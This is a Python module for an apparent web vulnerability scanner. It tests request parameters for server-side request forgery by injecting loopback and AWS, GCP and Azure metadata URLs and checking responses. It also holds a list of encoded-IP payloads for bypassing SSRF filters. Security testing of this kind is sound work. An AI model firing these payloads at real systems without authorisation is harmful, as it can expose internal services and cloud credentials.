"""SSRF scanner — detects Server-Side Request Forgery.

Strategy:
  1. Inject internal IP/hostname targets (127.0.0.1, metadata endpoints)
  2. Check if response differs from baseline (content, status, timing)
  3. Look for cloud metadata signatures in response body

Conservative: only probes with read-only GET targets, never writes.
"""
from __future__ import annotations

from typing import Any

from ..http import HttpClient, Session
from ..recipes.schema import Recipe
from .base import Scanner, Candidate

# SSRF probe targets — read-only, safe to request
_SSRF_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",        # AWS metadata
    "http://metadata.google.internal/computeMetadata/", # GCP metadata
    "http://169.254.169.254/metadata/instance",         # Azure metadata
]

# Signatures indicating successful SSRF
_SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-ipv4",              # AWS
    "computemetadata", "google",                         # GCP
    "microsoft", "azure",                                # Azure
    "root:", "/bin/", "/usr/",                           # Unix file read
    "localhost", "127.0.0.1",                            # Loopback reflection
    "<title>", "<html",                                  # Internal web page
]

# Bypass techniques for common SSRF filters
_BYPASS_TARGETS = [
    "http://0x7f000001",                    # hex IP
    "http://2130706433",                    # decimal IP
    "http://017700000001",                  # octal IP
    "http://127.1",                         # short form
    "http://0177.0.0.1",                    # mixed octal
]


class SsrfScanner(Scanner):
    """Detects SSRF by injecting internal URLs and checking responses."""

    vuln_classes = ["ssrf"]

    def __init__(self, client: HttpClient, session: Session):
        super().__init__(client)
        self.session = session

    async def _detect(self, target: str, recipe: Recipe,
                      **context: Any) -> list[Candidate]:
        params = context.get("params", [])
        method = context.get("method", "GET")
        id_location = context.get("id_location", "query")
        use_bypasses = context.get("use_bypasses", False)

        if not params:
            return []

        candidates = []
        probe_targets = list(_SSRF_TARGETS)
        if use_bypasses:
            probe_targets.extend(_BYPASS_TARGETS)

        for param in params:
            # Get baseline for comparison
            baseline = await self._get_baseline(
                target, param, method, id_location
            )

            for ssrf_url in probe_targets:
                try:
                    result = await self._probe(
                        target, param, ssrf_url, method, id_location, baseline
                    )
                    if result:
                        candidates.append(
                            self._make_candidate(
                                recipe=recipe,
                                endpoint=target,
                                method=method,
                                evidence=result,
                                confidence=result.get("confidence", "medium"),
                                request_data={
                                    "param": param,
                                    "ssrf_url": ssrf_url,
                                    "id_location": id_location,
                                },
                                response_data={
                                    "status": result.get("status"),
                                    "signature_match": result.get("signature_match"),
                                },
                            )
                        )
                        break  # one hit per param is enough
                except Exception:
                    continue

        return candidates

    async def _probe(self, target: str, param: str, ssrf_url: str,
                     method: str, id_location: str,
                     baseline: dict | None) -> dict | None:
        resp = await self._send(target, param, ssrf_url, method, id_location)
        body = resp.text[:3000].lower()

        # Check for SSRF signatures in response
        for sig in _SSRF_SIGNATURES:
            if sig.lower() in body:
                # Make sure it's not in the baseline too
                if baseline and sig.lower() in baseline.get("body", "").lower():
                    continue
                return {
                    "status": resp.status_code,
                    "ssrf_url": ssrf_url,
                    "signature_match": sig,
                    "body_snippet": resp.text[:500],
                    "confidence": "high" if "metadata" in ssrf_url else "medium",
                }

        # Check for significant response difference from baseline
        if baseline:
            baseline_len = baseline.get("length", 0)
            resp_len = len(resp.text)
            if abs(resp_len - baseline_len) > 200 and resp.status_code == 200:
                return {
                    "status": resp.status_code,
                    "ssrf_url": ssrf_url,
                    "signature_match": "response_length_anomaly",
                    "baseline_length": baseline_len,
                    "probe_length": resp_len,
                    "body_snippet": resp.text[:500],
                    "confidence": "low",
                }

        return None

    async def _get_baseline(self, target: str, param: str,
                            method: str, id_location: str) -> dict | None:
        try:
            resp = await self._send(
                target, param, "https://www.example.com", method, id_location
            )
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "body": resp.text[:1000],
            }
        except Exception:
            return None

    async def _send(self, target: str, param: str, value: str,
                    method: str, id_location: str):
        if id_location == "query":
            return await self.client.request(
                method, target, session=self.session,
                params={param: value},
            )
        elif id_location == "body":
            return await self.client.post(
                target, session=self.session,
                json={param: value},
                headers={"Content-Type": "application/json"},
            )
        else:
            raise ValueError(f"SSRF scanner doesn't support id_location: {id_location}")
